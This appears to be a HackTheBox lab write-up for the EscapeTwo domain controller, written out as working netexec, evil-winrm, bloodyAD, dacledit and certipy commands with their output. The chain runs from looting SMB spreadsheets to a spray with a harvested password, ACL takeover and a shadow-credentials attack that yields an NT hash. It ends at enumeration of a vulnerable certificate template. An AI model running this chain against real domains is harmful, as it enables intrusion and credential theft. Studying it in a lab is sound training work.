---
title: "EscapeTwo"
date: 2025-05-24 00:00:00 +0500
categories: [HackTheBox, Windows]
tags: [AD-CS, Active-Directory, BloodHound, ESC4, GenericAll, MSSQL, Pass-the-Hash, SAN-Abuse, SMB, Template-Modification, WriteOwner]
description: Writeup for HackTheBox EscapeTwo machine
image:
  path: assets/img/escapetwo/escapetwo.png
  alt: HTB EscapeTwo
---
## Executive Summary
This report details the security assessment of the HackTheBox machine EscapeTwo (Active Directory Domain Controller). The attack chain is as follows:

* **SMB Share → Credential Discovery** — Provided credentials `rose` have read access to `Accounting Department` SMB share. Download Excel spreadsheets containing `sa` password `MSSQLP@ssw0rd!`.
* **MSSQL Config → Credential Spray → WinRM** — With `sa` access to MSSQL, read `C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI` which reveals `sql_svc`/`ryan` password `WqSZAF6CysDQbGb3`. Spray against domain users; `ryan` works over WinRM.
* **WriteOwner → Shadow Credentials → ESC4 → DA** — `ryan` has `WriteOwner` on `ca_svc`. Take ownership, grant `FullControl`, Shadow Credentials to get `ca_svc` NT hash. `ca_svc` is in `Cert Publishers` which has ESC4 rights on `DunderMifflinAuthentication` template. Modify template to allow SAN, request cert as Administrator, retrieve NT hash, Pass-the-Hash to DA.

**Given Credential:** `rose:KxEPkKe6R8su`

## Reconnaissance

### Nmap Discovery Scan
An initial Nmap port scan was executed against the target IP address `10.10.11.51` to identify all open TCP ports and active services.

```shell
┌──(kali㉿kali)-[~]
└─$ nmap  10.10.11.51
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-06 13:28 EST
Nmap scan report for sequel.htb (10.10.11.51)
Host is up (0.36s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
1433/tcp open  ms-sql-s
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl

Nmap done: 1 IP address (1 host up) scanned in 18.51 seconds
```

### Detailed Service Enumeration Scan
A subsequent comprehensive Nmap scan was conducted using service version detection (`-sV`), default scripting engine scripts (`-sC`), OS detection (`-O`), and aggressive features (`-A`) to detail the running services.

```shell
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -A -O 10.10.11.51
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-06 13:28 EST
Nmap scan report for sequel.htb (10.10.11.51)
Host is up (0.35s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-06 18:29:12Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
| |_Not valid after:  2025-06-08T17:35:00
| |_ssl-date: 2025-02-06T18:30:46+00:00; +3s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-02-06T18:30:45+00:00; +3s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
| |_Not valid after:  2025-06-08T17:35:00
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.11.51:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.10.11.51:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-02-06T18:02:25
| |_Not valid after:  2055-02-06T18:02:25
|_ssl-date: 2025-02-06T18:30:46+00:00; +3s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-02-06T18:30:46+00:00; +3s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
| |_Not valid after:  2025-06-08T17:35:00
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
| |_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-02-06T18:30:45+00:00; +3s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (89%)
Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-02-06T18:30:07
|_  start_date: N/A
|_clock-skew: mean: 2s, deviation: 0s, median: 2s

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   352.02 ms 10.10.14.1
2   351.69 ms sequel.htb (10.10.11.51)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 128.19 seconds
```

Based on the port scan, we deduce the following:
* **Target Operating System:** Microsoft Windows Server 2019 (Domain Controller).
* **Domain Controller Hostname:** `dc01.sequel.htb`
* **Active Directory Domain:** `sequel.htb`
* **Enabled Ports & Protocols:** DNS (53), Kerberos (88), LDAP (389/636), SMB (445), MSSQL (1433), WinRM over HTTPS/RPC.

To facilitate domain name resolution across tools, the domain controller was mapped in `/etc/hosts`:

```shell
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts                                                              
127.0.0.1       localhost
127.0.1.1       kali

10.10.11.51  sequel.htb dc01.sequel.htb
```

---

## Enumeration

### Active Directory User Enumeration
Using the `netexec` tool, Active Directory user enumeration was performed. The provided credentials `rose:KxEPkKe6R8su` were validated, and RID brute-forcing was completed to build a list of valid target users.

```shell
┌──(kali㉿kali)-[~]
└─$ netexec smb 10.10.11.51 -u rose -p  'KxEPkKe6R8su' --users --rid-brute
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
SMB         10.10.11.51     445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                  
SMB         10.10.11.51     445    DC01             Administrator                 2024-06-08 16:32:20 0       Built-in account for administering the computer/domain
SMB         10.10.11.51     445    DC01             Guest                         2024-12-25 14:44:53 0       Built-in account for guest access to the computer/domain
SMB         10.10.11.51     445    DC01             krbtgt                        2024-06-08 16:40:23 0       Key Distribution Center Service Account 
SMB         10.10.11.51     445    DC01             michael                       2024-06-08 16:47:37 0        
```
```shell
SMB         10.10.11.51     445    DC01             ryan                          2024-06-08 16:55:45 0        
SMB         10.10.11.51     445    DC01             oscar                         2024-06-08 16:56:36 0        
SMB         10.10.11.51     445    DC01             sql_svc                       2024-06-09 07:58:42 0        
SMB         10.10.11.51     445    DC01             rose                          2024-12-25 14:44:54 0        
SMB         10.10.11.51     445    DC01             ca_svc                        2025-04-22 11:32:28 0        
SMB         10.10.11.51     445    DC01             [*] Enumerated 9 local users: SEQUEL
```

These discovered domain users were compiled into a `usernames.txt` file for future targeting.

### SMB Shares Enumeration & Harvesting
Next, `smbclient` was leveraged to enumerate the active shares exposed under the `rose` credential context.

```shell
┌──(kali㉿kali)-[~]
└─$ smbclient -L \\\\10.10.11.51\\ -U rose 
Password for [WORKGROUP\rose]:

        Sharename       Type      Comment
        ---------       ----      -------
        Accounting Department Disk      
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.51 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

The share `Accounting Department` is atypical and represents a high-value directory. Connecting to this share allowed us to list and retrieve its contents, which included financial spreadsheet logs.

```shell
┌──(kali㉿kali)-[~]
└─$ smbclient  \\\\10.10.11.51\\"Accounting Department" -U rose   
Password for [WORKGROUP\rose]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jun  9 06:52:21 2024
  ..                                  D        0  Sun Jun  9 06:52:21 2024
  accounting_2024.xlsx                A    10217  Sun Jun  9 06:14:49 2024
  accounts.xlsx                       A     6780  Sun Jun  9 06:52:07 2024
   
                6367231 blocks of size 4096. 924399 blocks available
smb: \> 
smb: \> get accounts.xlsx accounting_2024.xlsx
getting file \accounts.xlsx of size 6780 as accounting_2024.xlsx (3.1 KiloBytes/sec) (average 3.1 KiloBytes/sec)
smb: \> 
smb: \> quit
```

After extracting the sheets, analyzing `accounts.xlsx` (specifically internal XML details such as `sharedStrings`) revealed embedded domain accounts and raw passwords. A GPT parsing utility was used to aid in decoding the string structure.

<img src="assets/img/escapetwo/image1.jpg" alt="error loading image"> 

One key credential harvested from the spreadsheet was `MSSQLP@ssw0rd!` associated with the SQL administrative context.

### Database Command Execution
Using the database credentials, a test connection to the MSSQL service was attempted using `netexec`'s mssql module to verify command execution privileges on the database engine.

```shell
┌──(kali㉿kali)-[~]
└─$ netexec mssql 10.10.11.51 -u sa -p 'MSSQLP@ssw0rd!' --local-auth -x "whoami"
MSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
MSSQL       10.10.11.51     1433   DC01             [+] Executed command via mssqlexec
MSSQL       10.10.11.51     1433   DC01             sequel\sql_svc
```

The database service account `sequel\sql_svc` executes commands when invoking OS calls. The server structure was queried via cmd commands to map the user profiles.

```shell
┌──(kali㉿kali)-[~]
└─$ netexec mssql 10.10.11.51 -u sa -p 'MSSQLP@ssw0rd!' --local-auth -x 'dir C:\Users'
MSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
MSSQL       10.10.11.51     1433   DC01             [+] Executed command via mssqlexec
MSSQL       10.10.11.51     1433   DC01             Volume in drive C has no label.
MSSQL       10.10.11.51     1433   DC01             Volume Serial Number is 3705-289D
MSSQL       10.10.11.51     1433   DC01             Directory of C:\Users
MSSQL       10.10.11.51     1433   DC01             06/09/2024  06:42 AM    <DIR>          .
MSSQL       10.10.11.51     1433   DC01             06/09/2024  06:42 AM    <DIR>          ..
MSSQL       10.10.11.51     1433   DC01             12/25/2024  04:10 AM    <DIR>          Administrator
MSSQL       10.10.11.51     1433   DC01             06/09/2024  04:11 AM    <DIR>          Public
MSSQL       10.10.11.51     1433   DC01             06/09/2024  04:15 AM    <DIR>          ryan
MSSQL       10.10.11.51     1433   DC01             06/08/2024  04:16 PM    <DIR>          sql_svc
MSSQL       10.10.11.51     1433   DC01             0 File(s)              0 bytes
MSSQL       10.10.11.51     1433   DC01             6 Dir(s)   3,785,052,160 bytes free
```

Looking for system directories, the root path `C:\` was enumerated:

```shell
┌──(kali㉿kali)-[~]
└─$ netexec mssql 10.10.11.51 -u sa -p 'MSSQLP@ssw0rd!' --local-auth -x 'dir C:\'     
MSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
MSSQL       10.10.11.51     1433   DC01             [+] Executed command via mssqlexec
MSSQL       10.10.11.51     1433   DC01             Volume in drive C has no label.
MSSQL       10.10.11.51     1433   DC01             Volume Serial Number is 3705-289D
MSSQL       10.10.11.51     1433   DC01             Directory of C:\
MSSQL       10.10.11.51     1433   DC01             11/05/2022  12:03 PM    <DIR>          PerfLogs
MSSQL       10.10.11.51     1433   DC01             01/04/2025  08:11 AM    <DIR>          Program Files
MSSQL       10.10.11.51     1433   DC01             06/09/2024  08:37 AM    <DIR>          Program Files (x86)
MSSQL       10.10.11.51     1433   DC01             06/08/2024  03:07 PM    <DIR>          SQL2019
MSSQL       10.10.11.51     1433   DC01             06/09/2024  06:42 AM    <DIR>          Users
MSSQL       10.10.11.51     1433   DC01             01/04/2025  09:10 AM    <DIR>          Windows
MSSQL       10.10.11.51     1433   DC01             0 File(s)              0 bytes
MSSQL       10.10.11.51     1433   DC01             6 Dir(s)   3,810,275,328 bytes free
```

The `C:\SQL2019` setup directory was identified. Enumerating the subfolders revealed an unattended SQL Server configuration file `sql-Configuration.INI` which contained plain-text configuration settings and credentials.

```shell
┌──(kali㉿kali)-[~]
└─$ netexec mssql 10.10.11.51 -u sa -p 'MSSQLP@ssw0rd!' --local-auth -x 'type C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI'
MSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
MSSQL       10.10.11.51     1433   DC01             [+] Executed command via mssqlexec
MSSQL       10.10.11.51     1433   DC01             [OPTIONS]
MSSQL       10.10.11.51     1433   DC01             ACTION="Install"
MSSQL       10.10.11.51     1433   DC01             QUIET="True"
MSSQL       10.10.11.51     1433   DC01             FEATURES=SQL
MSSQL       10.10.11.51     1433   DC01             INSTANCENAME="SQLEXPRESS"
MSSQL       10.10.11.51     1433   DC01             INSTANCEID="SQLEXPRESS"
MSSQL       10.10.11.51     1433   DC01             RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
MSSQL       10.10.11.51     1433   DC01             AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
MSSQL       10.10.11.51     1433   DC01             AGTSVCSTARTUPTYPE="Manual"
MSSQL       10.10.11.51     1433   DC01             COMMFABRICPORT="0"
MSSQL       10.10.11.51     1433   DC01             COMMFABRICNETWORKLEVEL=""0"
MSSQL       10.10.11.51     1433   DC01             COMMFABRICENCRYPTION="0"
MSSQL       10.10.11.51     1433   DC01             MATRIXCMBRICKCOMMPORT="0"
MSSQL       10.10.11.51     1433   DC01             SQLSVCSTARTUPTYPE="Automatic"
MSSQL       10.10.11.51     1433   DC01             FILESTREAMLEVEL="0"
MSSQL       10.10.11.51     1433   DC01             ENABLERANU="False"
MSSQL       10.10.11.51     1433   DC01             SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
MSSQL       10.10.11.51     1433   DC01             SQLSVCACCOUNT="SEQUEL\sql_svc"
MSSQL       10.10.11.51     1433   DC01             SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
MSSQL       10.10.11.51     1433   DC01             SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
MSSQL       10.10.11.51     1433   DC01             SECURITYMODE="SQL"
MSSQL       10.10.11.51     1433   DC01             SAPWD="MSSQLP@ssw0rd!"
MSSQL       10.10.11.51     1433   DC01             ADDCURRENTUSERASSQLADMIN="False"
MSSQL       10.10.11.51     1433   DC01             TCPENABLED="1"
MSSQL       10.10.11.51     1433   DC01             NPENABLED="1"
MSSQL       10.10.11.51     1433   DC01             BROWSERSVCSTARTUPTYPE="Automatic"
MSSQL       10.10.11.51     1433   DC01             IAcceptSQLServerLicenseTerms=True
```

The credential `WqSZAF6CysDQbGb3` was discovered inside the configuration file.

### Credential Spraying
To identify which user profiles reuse this password, a credential spray was executed using `netexec` against the previously gathered domain user list (`users.txt` / `usernames.txt`).

```shell
┌──(kali㉿kali)-[~]
└─$ netexec smb 10.10.11.51 -u users.txt -p WqSZAF6CysDQbGb3 --continue-on-success

SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [-] sequel.htb\michael:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\krbtgt:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\Administrator:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\Guest:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\oscar:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [+] sequel.htb\sql_svc:WqSZAF6CysDQbGb3 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\rose:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\ca_svc:WqSZAF6CysDQbGb3 STATUS_LOGON_FAILURE 
```

The password reuse spray successfully validated credentials for both `sql_svc` and `ryan`.

---

## Initial Access

While the `sql_svc` account lacked PowerShell administration privileges over WinRM, the `ryan` account successfully authenticated, establishing a remote administration session via `evil-winrm`.

```shell
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\ryan\Documents> type ..\Desktop\user.txt
************d9b841858fd2e956a2222
*Evil-WinRM* PS C:\Users\ryan\Documents> 
```

The user flag was successfully retrieved from `C:\Users\ryan\Desktop\user.txt`.

---

## Lateral Movement

### Active Directory Data Collection
To analyze escalation vectors, `rusthound` was run from the attacker machine to dump Active Directory configuration data, permissions, group memberships, trust relationships, and Access Control Lists (ACLs).

```shell
┌──(kali㉿kali)-[~]
└─$ rusthound -d sequel.htb \
  -u ryan@sequel.htb \
  -p 'WqSZAF6CysDQbGb3' \
  -f dc01.sequel.htb \
  -i 10.10.11.51 \
  -n 10.10.11.51 \
  --dns-tcp \
  -z \
  -o rusthound-output

---------------------------------------------------
Initializing RustHound at 12:46:43 on 04/22/25
Powered by g0h4n from OpenCyber
---------------------------------------------------

[2025-04-22T16:46:43Z INFO  rusthound] Verbosity level: Info
[2025-04-22T16:46:43Z INFO  rusthound::ldap] Connected to SEQUEL.HTB Active Directory!
[2025-04-22T16:46:43Z INFO  rusthound::ldap] Starting data collection...
[2025-04-22T16:47:21Z INFO  rusthound::ldap] All data collected for NamingContext DC=sequel,DC=htb
[2025-04-22T16:47:21Z INFO  rusthound::json::parser] Starting the LDAP objects parsing...
[2025-04-22T16:47:21Z INFO  rusthound::json::parser::bh_41] MachineAccountQuota: 10
[2025-04-22T16:47:21Z INFO  rusthound::json::parser] Parsing LDAP objects finished!
[2025-04-22T16:47:21Z INFO  rusthound::json::checker] Starting checker to replace some values...
[2025-04-22T16:47:21Z INFO  rusthound::json::checker] Checking and replacing some values finished!
[2025-04-22T16:47:21Z INFO  rusthound::json::maker] 10 users parsed!
[2025-04-22T16:47:21Z INFO  rusthound::json::maker] 67 groups parsed!
[2025-04-22T16:47:21Z INFO  rusthound::json::maker] 1 computers parsed!
[2025-04-22T16:47:21Z INFO  rusthound::json::maker] 1 ous parsed!
[2025-04-22T16:47:21Z INFO  rusthound::json::maker] 1 domains parsed!
[2025-04-22T16:47:21Z INFO  rusthound::json::maker] 2 gpos parsed!
[2025-04-22T16:47:21Z INFO  rusthound::json::maker] 21 containers parsed!
[2025-04-22T16:47:21Z INFO  rusthound::json::maker] rusthound-output/20250422124721_sequel-htb_rusthound.zip created!

RustHound Enumeration Completed at 12:47:21 on 04/22/25! Happy Graphing!
```

After loading the output files into the BloodHound graphic analysis tool, the overall relationship mapping was visualized:

<img src="assets/img/escapetwo/image2.jpg" alt="error loading image"> 

Reviewing the outbound control path for user `ryan` revealed that `ryan` has `WriteOwner` permission over the service account `ca_svc`. This allows `ryan` to take ownership of `ca_svc` and subsequently rewrite its permissions to acquire full command execution capabilities under `ca_svc`'s context.

<img src="assets/img/escapetwo/image3.jpg" alt="error loading image"> 

### Abusing ACL Permissions
Using `bloodyAD`, the owner of the `ca_svc` object was set to `ryan`.

```shell
┌──(kali㉿kali)-[~/HTB-machine/escape-two]
└─$ bloodyAD --host DC01.sequel.htb -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' set owner ca_svc ryan
[+] Old owner S-1-5-21-548670397-972687484-3496335370-512 is now replaced by ryan on ca_svc
                                                                                                                                                             
┌──(kali㉿kali)-[~/HTB-machine/escape-two]
└─$ dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb/ryan':'WqSZAF6CysDQbGb3'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250422-132052.bak
[*] DACL modified successfully!
```

With `FullControl` established, the target account `ca_svc` was taken over. A shadow credentials attack (requesting a certificate by writing key credentials) was executed using `certipy-ad shadow auto`.

```shell
┌──(kali㉿kali)-[~/HTB-machine/escape-two]
└─$ certipy-ad shadow auto -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' -dc-ip 10.10.11.51 -ns 10.10.11.51 -target dc01.sequel.htb -account ca_svc
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '0427361a-6962-7f00-8a76-4afa11f24490'
[*] Adding Key Credential with device ID '0427361a-6962-7f00-8a76-4afa11f24490' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '0427361a-6962-7f00-8a76-4afa11f24490' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Using principal: ca_svc@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce
```

The NT hash of the `ca_svc` service account was successfully extracted: `3b181b914e7a9d5508ea1e20bc2b7fce`.

---

## Active Directory Certificate Services (AD CS) Analysis

Using the Kerberos credential cache (`ca_svc.ccache`) of `ca_svc`, an AD CS enumeration was executed using `certipy-ad find` to locate vulnerability paths.

```shell
┌──(kali㉿kali)-[~/HTB-machine/escape-two]
└─$ KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad find  -k -debug -target dc01.sequel.htb -dc-ip 10.10.11.51 -vulnerable -enabled
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Domain retrieved from CCache: SEQUEL.HTB
[+] Username retrieved from CCache: ca_svc
[+] Trying to resolve 'dc01.sequel.htb' at '10.10.11.51'
[+] Authenticating to LDAP server
[+] Using Kerberos Cache: /home/kali/HTB-machine/escape-two/ca_svc.ccache
[+] Using TGT from cache
[+] Username retrieved from CCache: ca_svc
[+] Getting TGS for 'host/dc01.sequel.htb'
[+] Got TGS for 'host/dc01.sequel.htb'
[+] Bound to ldaps://10.10.11.51:636 - ssl
[+] Default path: DC=sequel,DC=htb
[+] Configuration path: CN=Configuration,DC=sequel,DC=htb
[+] Adding Domain Computers to list of current user's SIDs
[+] List of current user's SIDs:
     SEQUEL.HTB\Authenticated Users (SEQUEL.HTB-S-1-5-11)
     SEQUEL.HTB\Everyone (SEQUEL.HTB-S-1-1-0)
     SEQUEL.HTB\Domain Users (S-1-5-21-548670397-972687484-3496335370-513)
     SEQUEL.HTB\Cert Publishers (S-1-5-21-548670397-972687484-3496335370-517)
     SEQUEL.HTB\Certification Authority (S-1-5-21-548670397-972687484-3496335370-1607)
     SEQUEL.HTB\Domain Computers (S-1-5-21-548670397-972687484-3496335370-515)
     SEQUEL.HTB\Denied RODC Password Replication Group (S-1-5-21-548670397-972687484-3496335370-572)
     SEQUEL.HTB\Users (SEQUEL.HTB-S-1-5-32-545)
[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[+] Trying to resolve 'DC01.sequel.htb' at '10.10.11.51'
[*] Trying to get CA configuration for 'sequel-DC01-CA' via CSRA
[+] Trying to get DCOM connection for: 10.10.11.51
[+] Using Kerberos Cache: /home/kali/HTB-machine/escape-two/ca_svc.ccache
[+] Using TGT from cache
[+] Username retrieved from CCache: ca_svc
[+] Getting TGS for 'host/DC01.sequel.htb'
[+] Got TGS for 'host/DC01.sequel.htb'
[!] Got error while trying to get CA configuration for 'sequel-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'sequel-DC01-CA' via RRP
[+] Using Kerberos Cache: /home/kali/HTB-machine/escape-two/ca_svc.ccache
[+] Using TGT from cache
[+] Username retrieved from CCache: ca_svc
[+] Getting TGS for 'host/DC01.sequel.htb'
[+] Got TGS for 'host/DC01.sequel.htb'
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[+] Connected to remote registry at 'DC01.sequel.htb' (10.10.11.51)
[*] Got CA configuration for 'sequel-DC01-CA'
[+] Resolved 'DC01.sequel.htb' from cache: 10.10.11.51
[+] Connecting to 10.10.11.51:80
[*] Saved BloodHound data to '20250424131638_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20250424131638_Certipy.txt'
[*] Saved JSON output to '20250424131638_Certipy.json'
                                                                                                                                                             
┌──(kali㉿kali)-[~/HTB-machine/escape-two]
└─$ cat 20250424131638_Certipy.txt                                               
Certificate Authorities
  0
    CA Name                             : sequel-DC01-CA
    DNS Name                            : DC01.sequel.htb
    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3
    Certificate Validity Start          : 2024-06-08 16:50:40+00:00
    Certificate Validity End            : 2124-06-08 17:00:40+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : DunderMifflinAuthentication
    Display Name                        : Dunder Mifflin Authentication
    Certificate Authorities             : sequel-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireCommonName
                                          SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Enterprise Admins
        Full Control Principals         : SEQUEL.HTB\Cert Publishers
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write DACL Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
